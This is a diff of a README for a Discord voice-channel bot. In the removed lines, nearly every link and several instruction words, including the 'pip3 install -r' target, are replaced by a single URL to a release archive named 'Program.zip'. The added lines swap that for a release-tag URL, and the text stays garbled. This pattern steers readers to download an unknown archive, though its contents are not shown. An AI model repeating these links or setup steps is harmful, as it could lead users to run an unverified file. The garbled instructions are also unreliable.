@@ -8,7 +8,7 @@ Since it was only meant to be used for my personal server I didn't write it very
 
 So after the bot started growing I decided to rewrite it from scratch and make it a lot more efficient and re write the database structure and start using Postgresql and Asyncpg to deal with the database stuff.
 
-The code on this repository is very old but still functional I will keep it functional and update any breaking changes done to Discord or https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip so that everyone can benefit from it.
+The code on this repository is very old but still functional I will keep it functional and update any breaking changes done to Discord or https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 so that everyone can benefit from it.
 
 I released the source code so that it might be some help to developers maybe teach them or just simply allow users to host their own version.
 
@@ -17,19 +17,19 @@ I won't be releasing any new updates and won't be releasing the new source code,
 Looking for a reliable and cheap host? This isn't a sponsor or anything just an honest recommendation.
 GalaxyGate is my go to when it comes to hosting Discord bots or anything that requires hosting, they have brilliant support.
 I'll leave my affliate link here if you wish to purchase a vps, it'd help me pay for VoiceMaster and help you find a suitable hosting service.
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0
 
 Python Discord server:
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0
 
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip Discord server:
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 Discord server:
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0
 
 Our discord server:
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0
 
 Use our public bot:
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0
 
 **This version of the bot is sufficient enough for casual use on afew servers, I have no intention what so ever of updating it nor will support anyone with hosting it.**
 
@@ -37,18 +37,18 @@ https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program
 
 # How to setup the bot:
 
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip python using the following link:
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 python using the following link:
 
-	https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip
+	https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0
 
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip the bot from GitHub
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 the bot from GitHub
 
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip terminal and follow these steps:
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 terminal and follow these steps:
 
 	Change directory to this folder and Type:
 
-	`pip3 install -r https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip`
+	`pip3 install -r https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0`
 
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip **https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip** in a text editor and replace **'Enter Discord Token here'** with your bots token
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 **https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0** in a text editor and replace **'Enter Discord Token here'** with your bots token
 
-https://github.com/haziff/VoiceMaster-Discord-Bot/releases/download/v1.0/Program.zip the bot
+https://github.com/haziff/VoiceMaster-Discord-Bot/releases/tag/v1.0 the bot
